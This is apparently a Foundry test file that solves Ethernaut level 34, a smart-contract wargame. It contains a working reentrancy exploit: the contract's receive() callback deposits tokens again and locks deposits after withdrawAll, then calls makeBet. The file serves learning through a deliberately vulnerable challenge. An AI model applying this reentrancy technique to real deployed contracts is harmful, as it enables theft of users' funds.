// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level34 {
    function pool() external view returns (address);
    function depositToken() external view returns (address);
    function makeBet(address) external;
    function withdrawAll() external;
    function lockDeposits() external;
    function approve(address, uint256) external returns (bool);
    function deposit(uint256) external payable;
}

contract Level34Test is EthernautTest {
    Level34 level34Instance;

    function testLevel34() public {
        _createLevel("34");

        level34Instance = Level34(levelInstance["34"]);

        // To place a bet we need to call makeBet where the following are met
        // 1. Balance of wrapped tokens of makeBet caller is 20 or more
        // 2. depositsLocked needs to have been set for that same caller

        // Solution
        // We can obtain 10 wrapped tokens by depositing 0.001 ether into the pool.
        // We can obtain 5 more wrapped tokens using the deposit tokens.
        // We can withdraw our deposit tokens, before the wrapped are burned.
        // Use the external call to get a further 5 wrapped tokens with those deposit tokens.
        // We now have 20 wrapped tokens.
        // We can then lock the deposits.
        // Then we can call makeBet successfully.

        Level34 pool = Level34(level34Instance.pool());

        Level34 depositToken = Level34(pool.depositToken());

        // Approve 10 total, giving us 5 initially and another 5 in the receive function
        depositToken.approve(address(pool), 10);

        // Initial deposit of 0.001 ether and 5 deposit tokens to get 15 wrapped tokens
        pool.deposit{value: 0.001 ether}(5);

        // Withdraw deposit tokens before wrapped tokens are burned
        pool.withdrawAll();

        require(_submitLevel("34"));
    }

    // Callback to get the extra 5 wrapped tokens
    receive() external payable {
        Level34 pool = Level34(level34Instance.pool());

        // Deposit 0 ether and 5 deposit tokens to get the extra 5 wrapped tokens
        pool.deposit{value: 0}(5);

        // Lock deposits to meet the second condition
        pool.lockDeposits();

        // Now we can call makeBet, done.
        level34Instance.makeBet(address(this));
    }
}
